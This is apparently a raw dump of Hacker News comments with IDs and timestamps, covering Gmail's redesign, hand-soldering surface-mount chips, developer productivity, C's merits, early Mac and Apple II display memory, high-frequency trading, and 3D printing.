On the rare occasions when I have to use the website or Android Gmail clients they seem so unproductive to me.  I think it is an information density thing - my desktop client (Thunderbird these days) is able to do a far better job of showing me more information at once.  It also has the ability to manage state a lot better than web apps so my different panes can have differing contexts.",1335499022

The old Google would not ""push"" a new interface when there is so much resistance to the new design. I may be suffering from a sample bias, but no Gmail user around me likes the new design. If they did test this stuff, maybe they cherry-picked their target population to get the results they wanted to please the designers. Who knows.",1335499021

3897422,comment,3896772,3897097,11,0,mbell,,,"> I don't know what kind of person would try to solder this by hand! It's a surface mount package. I wouldn't go near one without specialised equipment!<p>Its actually very easy to solder packages like this and you really don't need paste.  Paste is faster and results in less eye strain if your doing a bunch of them, just use a stencil for the paste application (which you can get easily and cheaply online).<p>The biggest mistake most people make when trying to solder things is thinking they need to do 1 pin at a time.  Unless your talking huge pins (DIP-8) you don't want to do this.  It is actually worse for the chip going pin by pin, you end up heating it up more and for a longer time.<p>Instead apply flux to the board, position the chip then ""tag"" opposite corner pins with solder to hold the chip in place.  From there add more flux to the pins and use very fine solder (this is key) + a fairly fat solder tip, like a 1/4"" chisel, just drag it down the each side of the chip while applying enough solder to suck onto the pins.  You can do the entire chip in about 60 seconds.<p>Chips that actually suck to hand solder are things like QFN, PLCC (with small pads), and anything with a center pad (especially if its a thermal connection to the ground plane).  You can hand solder such packages but its a serious pain and really can only be done correctly with a hot plate and hot air station.  Small parts suck also, 0402/0201 or smaller resistors or caps are not fun to do without without paste + reflow.<p>EDIT: I should add that land pattern makes a big difference too.  High density land patterns are much  more difficult to solder correctly without paste + hot air or reflow.",1335498377

Good developers are able to ""move the chains"" and help things get shipped.  Bad developers hold up the process.  Slippage can cost money.<p>I think there is a lot more to this than programming ability.  Perfection can get in the way of getting things done.  A ""cog in the machine"" mentality keeps developers from taking ownership and making key decisions.  Good developers accept that they don't know everything and tackle an area they aren't good at anyways because there is nobody better available for the issue.<p>What you didn't define is, top 10% of what?  All programmers?  All available programmers for hire?  All programmers who are working full time as programmers?<p>I'm not sure there is even a big enough gap between the top 1% and the top 10% to make much of a difference.  If the determining factor is being able to ship, then the top .1 % is probably either shipping their own products or have significant ownership in the companies they are coding for.<p>Beyond that, it depends on how big your pool is.  The best 1 out of 10 (10%) might be an average contributor just good enough to get in the door at a place not fighting for top talent.  The top 1 out of 100 might be good enough to get an interview anywhere in Silicon Valley.",1335498069

C is well tested and specified. Reading the standard isn't an exercise is face melting (compare with, say, C++).<p>3. As a systems language, C doesn't require a runtime library if not needed, and this can be left out very easily (not the case with Go, D, or C++, as I'm aware).<p>4. C exposes easy trapdoors to the underlying machine (inline assembly, pointers, etc.) that are very handy.<p>5. C is usable by other languages, as its calling conventions are well documented. This is why C is a preferred base language for things like OpenGL bindings--it's easy to write Ruby, Pyhton, Java, etc. wrappers. This is in sharp contrast to C++, which is brainfucked for things like symbol exports.<p>6. A line of C is pretty obvious in what it does, when written correctly.

The China supply chain risk is often overlooked, but even if the disruption is short term, it could have significant impact on current and new product introductions. The margins Apple current has on iPhones, iPads, iTunes and apps are likely to face significant pressures in the coming 12-24 months from competitors, perhaps excluding iTunes & apps, unless the iOS market share also shrinks.<p>The uniqueness has been a significant factor in driving past high net earnings and could be quickly lost.

Those were the days.<p>If by ""that idea"", you mean a memory-mapped display, then it certainly did make it to the original Macintosh -- as well as a number of subsequent models. The original Mac display was a little 9-inch CRT, 512 x 342 black-and-white-only pixels. One bit per pixel, so each scan line was 64 bytes. 342 lines made for a bit over 21K of display memory, out of 128K total. And that had to hold the OS & applications, too. (Those were the days....)<p>OTOH, I believe these Macs had only a single memory-mapped display buffer, not the multiple buffers that the Apple II line had. And of course no Mac ever had a text display buffer. And, true, you weren't <i>supposed</i> to write to the display buffer yourself. If you were a Good Person, then you used QuickDraw and the Window Manager. But you <i>could</i> write to it; no memory protection back then.<p>Another funky bit of info you didn't mention: the Apple II display buffers were not exactly 2-D arrays. The screen lines were not stored in order. I seem to remember that Woz mixed them up because it allowed for easier computation of the memory location of a character (?). (If this sounds implausible, remember that, back then, multiplication was <i>hard</i>.) And there were ""holes"" in the buffer that were not used for display. 1024 bytes for the text display buffer only had to hold 40 x 24 = 960 characters, leaving 64 bytes of free space scattered throughout the buffer. These extra locations were allowed to be used as scratch space by I/O devices: 8 bytes for each slot.",1335496937

Is there anything forcing them to keep supplying liquidity even if the market's moving against them?  How is an HFT different than an actual market maker?<p>2. How does an HFT decide that it has a better-than-even shot at turning a profit on a trade?  Most of the objections to HFTs revolve around the answers to this question (i.e. pseudo-front-running by trying to detect large buys/sells that get split over lots of orders) and their implications (i.e. 'real' investors leaving the exchanges).<p>3. The ""market-maker strategy"" HFTs you describe are indisputably compensated for providing liquidity and taking on risk, but is the return on HFTs actually equivalent to the return on other investments with equivalent risk?

It is similar to crowd screening in a sense, but really is more of a crowd sourced business idea validation engine. Imagine if there was a community / website where you could pitch your idea, have people vote on it and refine it. You could release your idea to as small or large a group or circle that you felt comfortable with. The goal would be to build a ""tribe"" around your idea that helps you refine it and validate it. We wanted to bake in the whole lean startup methodology into it. For example we had a step in the process called ""assumption junction"" where the tribe would list all the assumptions in the business idea and rank them by risk/importance. The community would then be tapped for building/refining surveys as well as for distributing the surveys or taking them themselves. Imagine if ideas where refined and validated by hundreds if not thousands of people before a single line of code was written. We called the idea ""The Darwin Project"", where only the strongest ideas survive.<p>This really jibed with coders we surveyed as they would love to be approached with ideas that are validated before they wrote any code.

If you can treat code as data, and concisely define an anonymous function, it saves a step.<p>Speaking of code==data and text adventures, I'm currently working my way through the book Land of Lisp[1]. Some chapters just focus on new concepts, but most illustrate concepts through the creation of a game (except for the streams chapter, which has you write a web server). The first game is an extremely basic text adventure. You can only move around and pick up objects, but it did parse 'normal' keyboard input. Now that I'm a few chapters deeper, I'm starting to see how it could be expanded to handle different actions, etc.<p>Another interesting approach to web-based adventure games is ""Adventure Games Live"". Instead of typing, you select a radio button for the action you want. Some of those games are extremely challenging (I've spent hours playing and haven't finished many of them)<p>[1] landoflisp.com\n[2] <a href=""http://www.rinkworks.com/adventure/"" rel=""nofollow"">http://www.rinkworks.com/adventure/</a>",1335495937

You need the 20/20 vision of hindsight to see what impact any particular development.  World War 1 wasn't named until long after the event.  This is not to say that people didn't know they were at war, or in a Depression.  Only that the scope and impact of the event can only be known after it has finished.<p>While every development or change results in a set of writers and thinkers keen to coin the phrase that defines it (hello 'web 2.0'), in reality you only get to write the story long after the event has happened.<p>Personally I do see 3d printing having a large impact if they become as widespread as the laser printer became.<p>It also makes me wonder if a home foundry kit will become a popular item.
